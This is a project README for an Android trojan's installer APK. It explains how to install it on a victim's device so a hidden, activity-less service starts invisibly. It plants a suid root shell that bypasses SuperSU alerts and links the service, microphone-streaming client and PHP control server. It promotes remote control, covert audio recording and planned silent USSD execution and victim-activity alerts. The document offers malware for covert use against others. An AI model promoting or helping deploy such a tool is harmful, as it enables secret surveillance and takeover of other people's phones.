# Android Trojan (Built with Android SDK 22) source code
The main manual is here: https://github.com/androidtrojan1/android-trojan-service-
UPD. 11.02.2016 Version 1.2 released!

DESCRIPTION:

This apk should be installed right after service apk is installed on victim's device. It is needed to start the service for the first time cause
otherwise it wouldn't start (it doesnt have activity for the purpose of invisibility). You can choose either root or regular install.
After installation this apk is no longer needed and may be deleted.

Optionally (it's set by default default, though) it also installs 2 useful native binaries to /system/bin directory  - busybox and simple suid shell. If the Android version is below 4.3, the suid bit will work and the shell will provide you the option of root commands execution with bypass of superSu app's alerts (should be run via regular shell command like : execroot your_cmd your_arg1 ...). Busybox in its turn gives you a good set of all the neccessary linux commands in case it hasnt been intalled in the system already.

HERE ARE LINKS TO THE OTHER COMPONENTS:

trojan service apk: https://github.com/androidtrojan1/android-trojan-service-

mic streamer pc client: https://github.com/androidtrojan1/android-trojan-streamer

trojan php server part: https://github.com/androidtrojan1/android-trojan-php-server



Android trojan with abilities of remote control,root commands execution, recording and online sound streaming

Compatible with all Android from Gingerbread (API 10) up to Lollipop (API 22)





have fun!

Upd. 11.09.2016  New Update is coming. New features in the upcoming version:
*  Telegram real-time notifications about victim's actions
*  silent execution of ussd codes
*  more interesting root features ^^
